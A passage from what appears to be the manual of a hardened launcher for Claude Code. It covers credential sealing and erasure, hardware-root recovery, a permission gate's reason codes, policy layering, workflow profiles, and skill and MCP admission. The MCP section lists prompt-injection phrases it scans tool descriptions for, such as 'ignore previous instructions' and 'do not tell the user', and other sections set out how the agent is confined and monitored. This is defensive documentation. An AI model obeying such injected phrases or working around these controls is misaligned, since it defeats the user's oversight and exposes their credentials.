1. stops **every process of the session first** and verifies that none is left (red-team N7b): claude is frozen (it stays alive as the child subreaper, so orphans keep being re-parented to it), its whole subtree, the scope's cgroup members, the processes carrying the session marker (environment or cgroup) and the launcher's own children started after claude are frozen and killed until none is left; then claude gets SIGTERM (3 s, so an interactive Claude Code restores the terminal) and SIGKILL, and everything is checked again. Only then is anything erased. If a process survived, the message lists it and `hardware.halt.credentials-erased` records `contained.verified: false` with the pids;
2. seals the session's context and the session's tool logins ([below](#the-sessions-context-and-tool-logins-sealed-ecwctl-context));
3. unless the policy sets `enclawedCode.onHardwareHalt.eraseClaudeCredentials: false`, erases **what Enclawed Code holds**: its sealed login (a fresh `ecwctl login new` is needed) and the session's own login storage. Your own Claude Code login is not touched ("your own Claude Code login (outside Enclawed Code) was not touched" in the message);
4. **only under the managed login policy**, also erases the plaintext login in your storage: the file is overwritten once with random bytes and removed (on macOS the login Keychain item is deleted), checked for 5 s (5 checks, fixed) and erased again if anything writes it back, then a detached watcher keeps checking for 60 s (`erase-watch.jsonl` in the state directory). With the policy, Enclawed Code also lists at launch and at the halt the other Claude Code processes on the machine that share that storage. **The erase is best effort**: a copy of the token taken before it keeps working; revoking the session at claude.ai is the real control;
5. records `hardware.halt.credentials-erased` (what was erased, what remains, never a secret), prints what happened and exits 4.

The latch stays DIRTY, so coming back needs the genuine device and a person at its console (`ecwctl recover-root`), [activation auth](#activation-auth), and, when the erase was on, `ecwctl login new`.

Limits, plainly: an overwrite is not guaranteed to reach the old blocks on SSDs, copy-on-write and journaling filesystems; erasing a local copy does not revoke the token at Anthropic; an `ANTHROPIC_API_KEY` in the environment or an `apiKeyHelper` is not touched.

### Claude Code's login, sealed (login watcher)

```
ecwctl login new [--replace]             sign in inside Enclawed Code; sealed at once, never written in plaintext
ecwctl login status                      where the logins are, and whether Enclawed Code's is sealed
ecwctl login seal [--replace]            on your explicit request: move your plaintext login into Enclawed Code's seal (plain claude loses it)
ecwctl login resolve --discard           erase logins an earlier build held (copies of your own login)
ecwctl login resolve [--replace]         under the managed login policy: adopt a held login as the sealed one
ecwctl login watch [--once]              under the managed login policy: run the watcher (foreground; --once: one pass)
ecwctl login watch install|remove|status under the managed login policy: the systemd user service that keeps it running
```

Enclawed Code's own login is kept sealed under the device and opened only in the launcher's memory, behind the kit's auth relay (claude holds a placeholder). `login new` runs Claude's own sign-in (OAuth authorization code with PKCE, the manual-paste page Claude Code 2.1.326 uses: `https://claude.com/cai/oauth/authorize`, redirect `https://platform.claude.com/oauth/code/callback`, Claude Code's client id and scopes): it prints the address, the person signs in in a browser and pastes the code shown, the state must match this attempt, and the code is exchanged at `https://platform.claude.com/v1/oauth/token` over verified TLS. The login goes straight into the seal (after a code the Enclaweder verifies) and is never written in plaintext.

**Held logins of an earlier build.** Earlier builds took a plaintext login out of your storage (sealed or quarantined into `<state>/claude-code/credentials/pending/`). Those are copies of your own login, not Enclawed Code's: they never refuse a launch now, every command mentions them, and `ecwctl login resolve --discard` erases them (audited as `claude-code.login.watch.discarded`).

**The watcher (managed login policy only).** Under the managed login policy, a plaintext login that appears in Claude Code's storage is taken out of its reach within 1 s (the kit's `CREDENTIAL_WATCH_BOUND_MS`, fixed; file-system events plus a 250 ms poll): renamed aside atomically, then sealed under the device in a session that holds it, or quarantined by the watcher process; a launch is refused (`login-pending`) until `login resolve` adopts it (a code the Enclaweder verifies) or `--discard` erases it. One watcher process per state directory (a newer one takes over, the older ends within 2 s); it ends when its state directory is gone or the policy is no longer in force, and the systemd unit `enclawed-code-login-watch.service` restarts it only after a failure (`Restart=on-failure`). Without the policy none runs: `login watch` says it is not needed, `login watch install` installs nothing, and `ecwctl doctor` names any watcher process still running from an earlier build (`codenclawed`, `enclawde`, a program that no longer exists, or a second one) with the `kill` command to stop it.

Limits, plainly: the watcher runs as the user, so any process of the user can stop it, and can read a plaintext login in the instant before it is moved. A Console (API key) sign-in also keeps `primaryApiKey` in `~/.claude.json`, which the watcher does not move. Moving a login does not revoke it: sign out of other Claude Code sessions at claude.ai.

### The session's context and tool logins, sealed (`ecwctl context`)

```
ecwctl context status    the sealed stores, and any plaintext context left in Claude Code's own directory
ecwctl context discard   erase both sealed stores (recorded); the next launch starts with no context
```

Root on a compromised computer can run plain `claude` (or `claude -c`, `--resume`, `gh`, `git`, `npm`, `aws` ...) and carry on the person's work, using the person's context and the logins the person's sessions made. With an Enclaweder bound (command set 0.5), none of that is on the computer in a usable form between sessions (src/session-state.mjs over the kit's context-seal.ts and tool-credentials.ts):

- **context.** Every session runs claude with `CLAUDE_CONFIG_DIR` pointed at a directory private to the session, under the session root, which is `XDG_RUNTIME_DIR` (memory-backed) first. Claude Code's context there is opened at launch from a store sealed to the launch's context box. That context is its transcripts and per-project memory (`projects/`), `todos/`, `plans/`, `file-history/`, `history.jsonl`, `tasks/`, `teams/`, `paste-cache/`, `image-cache/`, `backups/` and `debug/`. The context box is derived with the login's KEY_DERIVE on the launch's device-verified activation and has its own purpose. At the end of the session, and at a halt, the context is sealed again and the directory erased. The configuration Enclawed Code admitted (`settings.json`, `CLAUDE.md`, `skills/`, `plugins/`, `agents/`, `commands/` and so on) is linked from the person's own directory. `.claude.json` is a copy and is discarded. Shell snapshots, session-env scripts and caches never outlive the session;
- **tool logins.** The session's tools are pointed at a second private directory through their own variables (`GH_CONFIG_DIR`, `NPM_CONFIG_USERCONFIG`, `AWS_*_FILE`, `CLOUDSDK_CONFIG`, `AZURE_CONFIG_DIR`, `DOCKER_CONFIG`, `KUBECONFIG`, `HF_TOKEN_PATH`, `TF_CLI_CONFIG_FILE`, `VAULT_CONFIG_PATH`). Git gets a global config of the session's own, which includes the person's and keeps credentials only in the session's store. The keyring's bus is removed from claude's environment. The person's own configuration is copied in and is never sealed or changed. At the end, what the session made is sealed to the tools box. A credential a tool wrote into the person's home anyway is sealed and erased. A credential file the session changed is restored. A key added to the ssh agent is removed;
- **binding.** Every seal records the store's digest in the audit log (`claude-code.context.sealed`, `.discarded`, `.refused`). A launch opens a store only when it is exactly what the log last recorded. Otherwise the launch is refused (`context-not-as-recorded`), and `context discard` starts afresh.

After the start, the launcher forgets every key that opens these stores: it can seal and open nothing. Plaintext context made outside Enclawed Code (with plain `claude`) stays where it is, and each launch notes it.

Limits, plainly: during a live session, root can read the two directories and the launcher's memory, which holds the access token, and also the refresh token unless `ENCLAWEDER_ROOT=required`. With the root required, a refresh needs a new device-verified activation, which is one device-counted unlock use for a headless session. An interactive session's model access ends when the token expires: relaunch with `-c`. A credential written into the person's credential locations from outside the session while it runs is taken as the session's. The full closure is provider-side, with sender-constrained tokens bound to a device key: enclawed-oss `docs/security/session-takeover-root.md`.

### `ecwctl recover-root`

Clears a DIRTY latch with the genuine bound device present, with the open core's own checks: it lists the latch files (read only), refuses without an interactive terminal, requires activation auth, asks you to type the serial printed on the device, then calls the framework's recovery, which compares the present device's key with the bound one and runs a fresh challenge-response before it clears anything. Every attempt is recorded (`claude-code.hardware.recover`). Exit 0 when recovered or nothing is DIRTY, 1 otherwise.

`ecwctl doctor` shows the current status (`hardware root: software-only`, or the device's status). Every `session.start` record includes the hardware status and mode.

### `ecwctl recover-anchor`

Frees a BUSY anchor channel (red-team round 4, N15). The Enclaweder has one anchor session; whoever opens it first holds it, so a process that opened it and kept it, or a logger that crashed without closing it, makes every later launch stop with `ALARM ANCHOR_SESSION_BUSY`. The alarm says how to recover:

- **Firmware 0.2 or later** (session lease): the device ends a session 120 s after its holder's last renewal. The launcher's anchor sink renews it every 30 s while the session runs (`ANCHOR_KEEPALIVE`) and reopens as the next session after a lapse, so a crashed holder clears by itself; the alarm prints the time left (`waitMs`). To recover at once, `ecwctl recover-anchor --operator-offline N` takes the channel over with an operator quorum of N (PROTOCOL.md, "Operator takeover"): for each operator it prints the exact message the device checks; the operator signs it with their Ed25519 key on their own device (a hardware token or an offline station) and pastes the 64-byte signature (hex). The new session is closed at once. A takeover counts on the device as an open by another session, so the next launch is refused (exit 6) until you run [`ecwctl audit accept`](#ecwctl-audit-accept). Recorded as `claude-code.hardware.anchor-takeover`.
- **Operator keys must stay off this host** (round 5, R5-L): keep them in the device quorum's own hardware or offline (removable media plugged in for this command only). The command's host-side gates (an interactive terminal, activation auth, the device's serial typed in) are a convenience, not a control: any process of your user can call the framework's takeover directly with the keys, so the only real gate is the device's operator-signature quorum, and it is only as strong as where the keys are kept. So Enclawed Code accepts only signatures made elsewhere: `--operator-key FILE` is refused by `recover-anchor` and `recover-root` (a key file here is on this host), and the operator path (`--operator-offline`) of both commands is refused while an operator private key is found on this host: an Ed25519 private key (PEM/PKCS#8 or DER) in a directory named for operators (`operator*`, `quorum*`, `custod*`) under `~/.enclawed`, the state directory, `~/.config/enclawed`, `~/.config/ecwcode` or `~/.ecwcode`, a key file named like one (`*operator*`, `*quorum*`, `*custod*`) directly in your home, those directories or the current directory, or any key file a policy document names. The refusal lists what it found; move those keys off the machine and run the command again. SSH keys, other tools' signing keys and provisioning tools outside Enclawed Code are not looked at and keep working; the check runs only in Enclawed Code's own operator commands, before anything touches the device, and is recorded (`code: operator-key-on-host`). recover-root's two-factor path (authenticator code and recovery code, verified by the device) does not use operator keys and is not affected.
- **Firmware 0.1** (no lease): stop every Enclawed Code session on the machine, then unplug the Enclaweder and plug it back in (the device ends an anchor session only when it is re-enumerated), and start again.
- Without `--operator-offline`, `recover-anchor` prints this procedure.
- **No takeover by your own two factors yet.** With a hostile process of your user holding the channel (it keeps renewing the lease), the only ways back today are the operator quorum or a replug (the latch session then trips DIRTY: recover it with `recover-root`). A takeover authorized by your authenticator code and a recovery code, both verified on the device, needs a device command the current firmware does not have (round 5, N15). Software-only, a process outside the agent holding the channel is a compromised-host attack. If the channel is BUSY again right away, something on the machine is opening it: investigate (`ecwctl audit verify`).

The launcher always closes its session (`closeHeadAnchorSessions()`) before it releases the hardware root.

---

## Reason codes

Each `claude-code.tool.pre` record has a `codes` array. The reason shown to you contains the same information in words.

| Code | Decision | Meaning |
|---|---|---|
| `protected-path` | deny | The write (or a non-read-only command) targets Enclawed Code's own state, policy, audit log, history, code, Node binary, session files or hardware latch. |
| `secret-path` | deny | A read tool, or a shell command, that reaches one of [the secrets](#secrets-the-agent-may-not-read). |
| `hardlinked-path` | deny / irreversible | The write target has more than one hard link: denied when it is one of Enclawed Code's protected files, irreversible otherwise. |
| `owner-unauthenticated` | deny | The hardware relay did not prove the session secret. |
| `device-attestation-failed` | deny | The Enclaweder's answer was not a fresh, certified signature from the device bound at launch. |
| `egress-host-not-allowlisted` | ask | `WebFetch` to a host not on `allowedHosts`, with no list configured. |
| `symlinked-path` | ask | The write reaches another path through a symbolic link. |
| `git-config-runs-programs` | ask | The repository's git config can make this git read start a program. |
| `settings-env-overrides` | ask | A settings file sets a variable that changes what shell commands run. |
| `hardware-dirty` | deny | The Enclaweder reports DIRTY. |
| `hardware-unavailable` | deny | The Enclaweder is bound but unavailable. |
| `hardware-required-missing` | deny | `ENCLAWEDER_ROOT=required` and no device is bound. |
| `hardware-boot-refused` | deny | The per-call boot refused (a required device absent, a latched DIRTY, an accredited session that may not continue without its device). |
| `owner-unavailable` | deny | The Enclawed Code launcher holding the device for this session cannot be reached. |
| `hardware-halted` | deny | The device owner reported a halt. |
| `tool-not-allowlisted` | deny | Not on `allowedTools` while allowlists are enforced. |
| `host-not-allowlisted` | deny | `WebFetch` host not on `allowedHosts`. |
| `read`, `read-only-retrieval`, `session-internal`, `subagent`, `read-only-command` | allow | See the decision table. |
| `history:snapshot`, `history:git-clean`, `history:scratch` | allow | The write's history exists or is irrelevant. |
| `exec-config-path` | irreversible | Execution-config path. |
| `untracked-overwrite` with `git-untracked`, `git-ignored` or `git-state-unknown` | irreversible | Replaces the content of an existing file git does not track or ignores (snapshot kept). |
| `no-history-path`, `no-history-tool`, `over-size-cap`, `over-retention-budget`, `outside-allowed-roots`, `special-file`, `unreadable`, `store-failed`, `unresolvable-path`, `no-history` | irreversible | No history can be kept for the write. |
| `shell:<code>` | irreversible | `<code>` is one of `no-command`, `command-too-long`, `unbalanced-quote`, `shell-expansion`, `shell-metacharacter`, `env-assignment`, `command-not-allowlisted`, `argument-not-read-only`. |
| `mcp-tool` | irreversible | MCP tool. |
| `unknown-tool` | irreversible | Tool not known to be reversible. |
| `workflow:tool-not-allowed`, `workflow:path-not-allowed`, `workflow:command-not-allowed`, `workflow:mcp-tool-not-allowed`, `workflow:skill-not-allowed` | deny | Outside the session's [workflow profile](#workflow-profiles). Denied in every permission mode. |
| `skill-not-verified` | deny | The `Skill` tool named a skill that is not in the session's verified set. |
| `skill-script-not-verified` | deny | A shell command names, or runs in, a skill directory that is not in the verified set. |
| `mcp-server-not-admitted`, `mcp-tool-not-pinned` | deny | The MCP tool is not a pinned tool of a server admitted for the session. |
| `claude-ai-connector-not-allowed` | deny | A claude.ai connector tool (`mcp__claude_ai_*`) the policy does not list. |
| `pre-approved` | (added) | Irreversible, allowed by `preApprovedIrreversibleTools`. |
| `no-person:bypassPermissions` | (added) | Irreversible, denied because nobody can be asked. |

"Irreversible" means ask, unless one of the two added codes applies.

---

## Policy

### Where it is read from

1. The organization's managed policy, if the file exists. It is the **base**: a user policy file (2 to 5) is layered over it **tighten-only**. It must be owned by root, mode no wider than 0644, not a symlink, in root-owned directories no group or other user can write (the same check as the [opt-out file](#admin-only-opt-outs)); a managed file that fails the check, or is invalid, refuses the start (it is never skipped). Only this file may set the flavor (`"enclawedCode": { "flavor": "enclaved" }`, exactly `open` or `enclaved`):

   | OS | Path |
   |---|---|
   | Linux | `/etc/enclawed/claude-code/policy.json` |
   | macOS | `/Library/Application Support/Enclawed/claude-code/policy.json` |
   | Windows | `C:\ProgramData\Enclawed\claude-code\policy.json` |

2. `ENCLAWED_CONFIG_PATH` in the environment you start `ecwcode` from (your shell). The launcher resolves it once and records it in the session file. A settings file's `env` cannot change it: the hook never reads its environment, and the launcher pins the name if a settings file sets it.
3. The file named by `ecwctl policy use <path>` (kept in `<state>/claude-code/config.json`; `policy use --clear` removes it).
4. **Enclawed Code's own policy**, `<state>/claude-code/enclawed.json` (default `~/.enclawed/claude-code/enclawed.json`), written by `ecwctl policy init`. Keeping it separate means Enclawed Code's policy never changes the Enclawed gateway's config.
5. The Enclawed gateway's config, located the way the gateway does (without `ENCLAWED_CONFIG_PATH`, handled above): `~/.enclawed/enclawed.json` if it exists; else `~/.openclaw/openclaw.json`; else `enclawed.json` in the workspace directory. `~` is `ENCLAWED_HOME` when set, otherwise your home directory. Enclawed Code reads it and never writes it.

Of 2 to 5, the first file that exists is your policy (`ecwctl policy show` lists them all, marks it, and lists what was refused). In managed mode (no launcher) the hook uses 1, 3, 4 and 5 with the OS account's home directory. All have the shape `{ "enclawed": { "policy": { ... } } }`; Enclawed Code's own options live beside it in a top-level `enclawedCode` block (see [Enclawed Code options](#enclawed-code-options)).

**Flavor.** The managed policy's `enclawedCode.flavor` (open without a managed policy). `ENCLAWED_FLAVOR` in your shell can only raise it: `enclaved` turns an open base into enclaved, `open` never lowers an enclaved one, and any value that is not exactly `open` or `enclaved` (`permissive`, `Enclaved`, a typo) is read as `enclaved`, the strictest, with a warning.

**Layering.** With a managed policy, or in the enclaved flavor, your policy is applied **tighten-only** over the base (the managed policy, or the flavor's defaults): `enforceAllowlists: false` over a true base, an `allowedTools`/`allowedHosts`/`preApprovedIrreversibleTools`/`scratchPaths` entry the base does not have, `commandNetwork: "host"` over `none`, a larger `history.maxFileBytes`/`maxTotalBytes`, a **smaller** `history.maxAgeDays`, a higher clearance, a weaker `inputCleaner`, `eraseClaudeCredentials: false`, a longer `auth.unlockMinutes`, `skills.bundled: "on"`, a `claudeAiConnectors`/`overwritablePaths` entry the base lacks, a profile that replaces one of the base's or a project binding that changes one of the base's are each refused (the base value stays), printed and recorded in `claude-code.launch.opt-outs`. Everything that narrows the base applies. In the open flavor without a managed policy, your file is the policy, layered on the open defaults as before. `allowedTools`, `allowedHosts` and `preApprovedIrreversibleTools` are trimmed and lowercased when loaded, so `"Read"` and `"Docs.Example.com"` match.

| Situation | open flavor | enclaved flavor | managed policy |
|---|---|---|---|
| no file | open defaults (allowlists not enforced) | enclaved defaults: allowlists enforced, `allowedTools` empty, `allowedHosts` loopback only, so every tool is denied | (not applicable) |
| file has no `enclawed.policy` block | open defaults | allowlists enforced, all lists empty | the flavor's defaults, as in the first two columns |
| the gateway's config is not plain JSON, or its block is invalid | defaults, with a note (`doctor` shows it) | every `PreToolUse` denied | every `PreToolUse` denied |
| Enclawed Code's own file, a `policy use` file or `ENCLAWED_CONFIG_PATH`'s file is not valid JSON or invalid | every `PreToolUse` denied | every `PreToolUse` denied | every `PreToolUse` denied |
| file exists but cannot be read | every `PreToolUse` denied | every `PreToolUse` denied | every `PreToolUse` denied |

### Policy commands

```
ecwctl policy init [--tool T]... [--host H]... [--enforce] [--scratch DIR]... [--pre-approve T]...
                              [--max-file-bytes N] [--max-total-bytes N] [--max-age-days N]
                              [--erase-credentials-on-halt yes|no] [--auth-method M] [--file P] [--force] [--yes] [--json]
ecwctl policy show [--json] | path | edit [--file P] | validate [FILE]
ecwctl policy add-tool|remove-tool T... | add-host|remove-host H...
ecwctl policy use PATH | --clear
```

`init` writes Enclawed Code's own policy (or `--file`). At a terminal and without `--yes` it asks: enforce a tool allowlist (offering Claude Code's tools with a default pick), hosts `WebFetch` may reach without asking, pre-approved irreversible tools, scratch directories, the credential erase on a hardware halt, the input cleaner (`on`, `audit` or `off`; flag `--input-cleaner`), and the activation auth method. With flags and `--yes` it asks nothing, for install scripts. It refuses to replace an existing file without `--force`. Every write is validated exactly as the hook loads it (the framework's loader after normalization; `"*"` is refused in every list), written atomically with mode 0600, and recorded as `claude-code.policy.change` with the SHA-256 of the file before and after. When activation auth is set up, every write needs it; turning `eraseClaudeCredentials` off needs it always.

### Enclawed Code options

```json
{ "enclawedCode": {
    "onHardwareHalt": { "eraseClaudeCredentials": true },
    "auth": { "method": "auto", "required": true, "unlockMinutes": 10 },
    "inputCleaner": "on" } }
```

A policy file written by an earlier build names this block `codenclawed` (or `enclawde`); it is read the same way, and a file with more than one of these blocks is refused.

| Key | Default | Meaning |
|---|---|---|
| `onHardwareHalt.eraseClaudeCredentials` | `true` | Erase Claude Code's login when the hardware root halts mid-session. |
| `auth.method` | `auto` | `auto` or `fido2` (the only accepted factor; the retired methods are refused with the reason). |
| `auth.required` | `true` | Two-factor authentication is mandatory: only `true` is accepted. |
| `inputCleaner` | `on` | The [input cleaner](#the-input-cleaner): `on` removes hidden characters from tool results before the model reads them, `audit` only records what it would remove, `off` turns it off. Any other value is an error. |
| `auth.unlockMinutes` | `10` | How long an interactive verification unlocks headless runs in the same login session: a whole number of minutes from 1 to 480; a user file cannot raise the managed policy's value. |
| `flavor` | (open) | `open` or `enclaved`. **Managed policy only**: in any other file it is an error. |
| `overwritablePaths` | `[]` | Files and directories the agent may overwrite although git does not track or ignores them (generated files, build outputs, a `.env.local` you regenerate): absolute, or relative to the project; each entry covers the path and everything under it, compared exactly (no case folding, no wildcards). A snapshot is still kept. `""`, `.`, a filesystem root and `..` segments are errors. Without an entry, [overwriting such a file](#file-writes) asks. |

Unknown keys or wrong types are errors, as in the policy block.

### Keys Enclawed Code honors

| Key | Type | Default | Effect in Enclawed Code |
|---|---|---|---|
| `enforceAllowlists` | boolean | open: `false`; enclaved: `true`; when a file is present without the key: the flavor's value | Turns on the `allowedTools` check, and the `allowedHosts` check for `WebFetch`. |
| `allowedTools` | string array | `[]` | Tools allowed to run while allowlists are enforced. Compared exactly with the lowercased tool ids, so write them lowercase (`read`, `bash`, `mcp__github__create_issue`, or gateway ids such as `exec`). |
| `allowedHosts` | string array | open: `[]`; enclaved without a file: `127.0.0.1`, `::1`, `localhost` | Hosts `WebFetch` may reach. Enforced when allowlists are enforced or the list is non-empty. Compared with the URL's lowercased hostname, so write them lowercase. |
| `preApprovedIrreversibleTools` | string array | `[]` | Irreversible calls of these tools run without asking (still recorded; still denied by a hardware halt or the allowlist). Ids are trimmed and lowercased; empty ids and `*` are rejected. |
| `scratchPaths` | string array of absolute directories | `[]` | Writes inside them need no history. No wildcards; entries covering the filesystem root or a home directory are rejected. |
| `history.maxFileBytes` | whole number, 1 to 268435456 (256 MiB) | 16777216 (16 MiB) | Larger files get no snapshot (`over-size-cap`). Outside the range: the policy is invalid. |
| `history.maxTotalBytes` | whole number, 1 to 68719476736 (64 GiB) | 1073741824 (1 GiB) | A snapshot that would exceed it is refused (`over-retention-budget`). Outside the range: the policy is invalid. |
| `history.maxAgeDays` | whole number of days, 7 to 365 | 30 | Retention for `history prune`. A smaller age would prune the restore points that "reversible" writes rely on, so values below 7 (or not whole days) make the policy invalid, and a user file cannot lower the managed policy's value. |
| `history.noHistoryPaths` | string array of absolute paths or `*`/`**` globs | `[]` | Writes there keep no history, so they are irreversible. Root or whole-home entries are rejected; `?`, `[]`, `{}` are not allowed. |
| `history.noHistoryTools` | string array | `[]` | Writes by these tools keep no history (Claude Code names or gateway ids, lowercased). |

`allowedChannels`, `allowedProviders`, `commandNetwork`, `maxOutputClearance` and `defaultDataLabel` are validated (an invalid value makes the block invalid) but have no effect in Enclawed Code. Unknown keys in `history` are rejected; unknown top-level policy keys are ignored.

Example:

```json
{
  "enclawed": {
    "policy": {
      "enforceAllowlists": true,
      "allowedTools": ["read", "glob", "grep", "write", "edit", "bash", "agent", "todowrite"],
      "allowedHosts": ["docs.python.org"],
      "preApprovedIrreversibleTools": ["mcp__github__create_pull_request"],
      "scratchPaths": ["/srv/agent-scratch"],
      "history": { "noHistoryPaths": ["/data/datasets/**"], "maxFileBytes": 16777216, "maxAgeDays": 14 }
    }
  }
}
```

---

## Workflow profiles, skill admission and MCP admission

Three admission checks run before a session starts and again at the gate for every call. Each one only narrows what the base policy allows: a call that passes them still gets the ordinary decision (allowlists, protected paths, reversibility, pre-approval).

### Workflow profiles

A workflow profile is an allowlist for one kind of work. Anything outside it is **denied, not asked**, in every permission mode (`bypassPermissions` included), with a reason naming the profile. Its purpose is to make a hallucinated but technically permitted destructive action impossible: under `review`, `rm data/dummy_1.txt` is denied whatever the permission mode.

```
ecwcode --workflow review [claude options]
ecwctl policy workflow list            # built-in and policy profiles, and the project bindings
ecwctl policy workflow show review
ecwctl policy workflow bind docs [--project DIR]   # this project runs only under "docs" (two-factor)
ecwctl policy workflow unbind [--project DIR]
```

Built-in profiles (a policy profile with the same name replaces one):

| Profile | Tools | Writes | Shell commands | Network, MCP, skills |
|---|---|---|---|---|
| `review` | read, session, agent, shell | none | `@read-only` (the read-only allowlist) | none |
| `docs` | read, session, agent, write, shell | `docs/**` | `@read-only` | none |
| `build` | read, session, agent, write, shell | the project | `@read-only` and an allowlist of build and test commands (`npm test`, `make *`, `cargo build *`, `go test *`, `pytest *`, ...) | none |
| `ops` | read, session, shell | none | only what the policy lists (none built in) | none |

A profile in the policy (`enclawedCode.workflows.<name>`): `tools` (tool classes `read`, `web`, `write`, `shell`, `agent`, `session`, `skill`, `mcp`, or exact tool names), `paths.read` and `paths.write` (globs, project-relative or absolute; `**` crosses directories; reads default to the project), `commands` (`@read-only`, or one simple command per pattern; a trailing `*` takes any further arguments; a compound, redirected or expanded command never matches a pattern), `mcpTools` (`mcp__<server>__<tool>` or `mcp__<server>__*`) and `skills` (names, or `*` for any verified skill). Unknown keys are refused when the policy loads.

Selection: `--workflow NAME` at launch, or `enclawedCode.projectWorkflows` (`{ "<project dir>": "<profile>" }`, the nearest bound ancestor wins). A bound project refuses a different `--workflow`; an unknown name refuses the launch. The resolved profile goes into the session file, so the hook never re-reads it. Records: `claude-code.workflow.select` at every launch, `claude-code.workflow.change` when a project's profile (name or definition digest) differs from its previous launch, `claude-code.workflow.binding` for `bind`/`unbind`, and the `workflow` field of every `claude-code.tool.pre`. `policy show` and `doctor` print the profile bound to the current directory. In managed mode the project binding applies; `--workflow` needs per-session hooks and is refused there.

### Skill admission

Before a session starts, every skill Claude Code would load is verified against its signed formal bundle by the **biconditional criterion**: a skill is admissible only if its implementation does exactly what its declared specification states, in both directions.

- **Specification:** the capability set in the skill's `SKILL.md` frontmatter, `enclawed-capabilities: [fs.read, spawn.proc]` (from `net.egress`, `fs.read`, `fs.write.rev`, `fs.write.irrev`, `tool.invoke`, `spawn.proc`, `publish`, `pay`, `mutate.schema`; none declared means none).
- **Implementation:** every file of the skill directory. The effects its scripts can produce are computed by the framework's sound static effect analysis (Method A of enclawed-oss `enclawed/src/skill-formal-static.mjs`).
- **Both directions:** every effect the implementation can produce is declared (no undeclared effect; no reflective construct such as `eval`, `exec` or a dynamic import; no file the analysis cannot read, such as a binary), and every declared capability is produced by the implementation (no declared behavior it does not have).
- **The bundle** (`produceFormalBundle` of enclawed-oss `enclawed/src/skill-formal-bundle.mjs`: Method A/B/C evidence and an Ed25519-signed attestation) is a cache, not a trust source. At every launch Enclawed Code recomputes the skill's manifest from disk (a content digest of every file, `SKILL.md` included), checks the attestation's manifest hash and signature against the [trust list](#trust-model), re-runs Methods A, B and C (`verifyFormalBundle`) and the biconditional.

A skill is `verified`, or one of: `unverified` (no bundle), `tampered` (its files, or the bundle's manifest, changed after signing), `drifted` (the evidence no longer reproduces) or `failed` (unsigned, signer not trusted, the criterion does not hold, a symbolic link or unreadable file in it).

Where skills come from: the project's `.claude/skills/*/SKILL.md` and nested `.claude/skills` below it, `<config dir>/skills`, `--add-dir` directories, enabled plugins (`enabledPlugins` in the settings sources `--setting-sources` selects, and `--settings`; install paths from `<config dir>/plugins/installed_plugins.json`) and `--plugin-dir`.

What happens to a skill that is not verified: by default the launch is refused (exit 2, record `claude-code.launch.refused` with reason `skills-not-admissible`). With `enclawedCode.skills.unverified: "exclude"` the session starts and the skill is switched off with Claude Code's `skillOverrides` (`"off"`, settings schema 2.1.326). Either way, at the gate the `Skill` tool may load only a verified skill (`skill-not-verified`) and no shell command may name or run from a file under a skill directory outside the verified set (`skill-script-not-verified`). The generated settings also set `disableSkillShellExecution` (inline shell commands in skill prompts run when a skill loads, not as a tool call the hook sees), `syncClaudeAiSkills: false` and `syncClaudeAiPlugins: false` (not on disk to verify), and `disableBundledSkills` unless `enclawedCode.skills.bundled` is `"on"`. Claude Code 2.1.326 still lists the skills of its built-in plugins; the gate denies them like any unverified skill.

During the session the launcher re-checks the verified skills' content digests every second and rediscovers skills; a change, or a new skill, stops claude (exit 7, `claude-code.launch.skill-drift`). Verification runs again on every launch.

```
ecwctl skills list [--json]          # every skill that would load here, and its status
ecwctl skills verify [NAME...]       # exit 1 unless all are verified
ecwctl skills sign NAME... | --all   # check the criterion, then produce and store the signed bundle (two-factor)
ecwctl skills unsign NAME
```

`skills sign` prints each skill's declared and implemented capability sets and refuses a skill that does not satisfy the criterion. Records: `claude-code.skills.sign`, `claude-code.skills.unsign`, the `skills` field of `claude-code.launch.admission`.

### MCP admission

After enclawed-oss `extensions/mcp-attested`:

- **Only pinned or attested servers start.** Every launch passes Claude Code `--mcp-config=<generated file> --strict-mcp-config`: the generated file holds only the admitted servers, so every other definition (user and local scope in `~/.claude.json`, the project's `.mcp.json`, plugins, other `--mcp-config` values, claude.ai connectors) does not start. A server is admitted when a record for its name is signed by a [trusted signer](#trust-model) and its current definition (transport, command, arguments, environment, URL) and executable digest equal the pinned ones. `ecwctl mcp pin NAME` starts the server once, reads `initialize` (name, version) and every `tools/list` page, refuses a tool set that is flagged (below) or shadows a Claude Code tool, and after two-factor authentication stores the signed record. `ecwctl mcp import FILE` stores a record attested by another trusted signer. A project `.mcp.json` server stays refused at launch (as before) unless it is pinned or attested with that exact definition.
- **Remote servers** (`"type": "http"` or `"sse"`) are pinned and connected too, through Enclawed's own remote transport (no `mcp-remote` bridge): `mcp pin NAME` reads the server once and signs its URL and transport (and any `--authorization-origin https://...` on another site its OAuth metadata may name) into the record; nothing of it runs on this machine, so it takes no `--containment`. In a session the proxy connects only with that signed part (another URL or transport: `mcp-remote-url-mismatch`; none: `mcp-remote-not-admitted`), every `tools/call` body goes through Enclawed's egress checks first, and the server must report the pinned name and version. A server that needs an OAuth sign-in is authorized once, by you, at `mcp pin` (and again with `mcp login NAME` when its refresh token is refused): Enclawed Code prints the authorization address for you to open (it never opens it), registers itself with the service when the service allows it (else give `--client-id` with the id the service issued, and `--scope`), and takes the answer on a one-time listener on 127.0.0.1. The tokens are kept in Enclawed's credential store in Enclawed Code's state, sent to that server only, refreshed when they expire, and never reach Claude, its environment or its transcript. Headers in the definition (an `Authorization` or API-key header, `${VAR}` taken from the environment) are sent to that server only, and their secret values are removed from every answer.
- **Tool definitions are pinned by hash** (SHA-256 of the canonical JSON of each tool). Each admitted server runs behind `ecwcode-mcp-proxy`, which reads the digest-checked session file, starts the real server with the pinned command, and checks every `initialize` and `tools/list` answer: another server identity, an unpinned tool, or a definition that changed after approval (a rug pull) is answered with an error, every later call is refused, and the launcher stops the session (exit 7, `claude-code.launch.mcp-violation`). A `tools/call` for an unpinned tool never reaches the server.
- **No shadowing:** the same tool name on two admitted servers, a tool named like a Claude Code tool, or two server names that map to the same `mcp__<server>__` prefix (or to the claude.ai connectors' `mcp__claude_ai_` prefix) refuses the launch.
- **Descriptions are inspected:** every string of a tool definition goes through the input cleaner (hidden characters, hidden HTML, imitation notices) and a check for instructions aimed at the model (instruction tags such as `<IMPORTANT>`, "ignore previous instructions", "do not tell the user", "before using this tool, read ...", credential paths, exfiltration phrasing). A flagged definition cannot be pinned, and since the definition is pinned by hash, it cannot become flagged later without being a rug pull.
- **At the gate**, an MCP tool must be a pinned tool of an admitted server (`mcp-server-not-admitted`, `mcp-tool-not-pinned`), and a workflow profile narrows further with `mcpTools`. Admitted calls still ask (or run pre-approved), as before.
